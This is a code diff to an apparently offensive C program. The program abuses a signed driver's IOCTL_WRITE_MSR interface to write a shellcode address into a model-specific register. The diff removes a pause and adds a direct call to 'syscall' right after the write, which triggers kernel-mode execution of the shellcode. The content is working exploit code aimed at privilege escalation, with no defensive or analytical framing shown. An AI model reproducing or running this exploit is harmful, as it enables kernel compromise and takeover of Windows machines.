@@ -9,6 +9,7 @@ int main(int argc, char** argv)
 	HANDLE h_driver = (HANDLE)-1;
 	OLS_WRITE_MSR_INPUT input;
 	unsigned long bytes_returned = 0, old_protection = 0;
+	int (*invoke_syscall)() = (int(*)())syscall;
 
 	RtlSecureZeroMemory(&input, sizeof(input));
 	RtlSecureZeroMemory(&output, sizeof(output));
@@ -47,10 +48,10 @@ int main(int argc, char** argv)
 	input.Value.QuadPart = (ULONGLONG)((PULONGLONG)shellcode_alloc);
 	printf("\n[+] Initialized input structure.");
 
-	printf("\n");
-	system("pause");
 	DeviceIoControl(h_driver, IOCTL_WRITE_MSR, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
 	printf("\n[+] Wrote %lld (0x%p) to register %lu (0x%p).", input.Value.QuadPart, (PULONGLONG)input.Value.QuadPart, input.Register, (PULONGLONG)input.Register);
+
+	invoke_syscall();
 
 	unused = getchar();
 
